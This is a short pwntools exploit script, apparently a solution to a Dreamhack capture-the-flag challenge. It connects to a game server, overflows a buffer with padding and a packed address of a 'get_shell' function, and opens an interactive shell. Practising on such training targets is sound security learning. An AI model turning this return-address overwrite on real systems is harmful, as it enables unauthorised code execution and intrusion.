from pwn import *

r = remote("host3.dreamhack.games",20602)

context.arch = "amd64"
get_shell = 0x8048609

payload = b'A'*0x80 + b'B'*0x4
payload += p32(get_shell)

r.send(payload)
r.interactive()
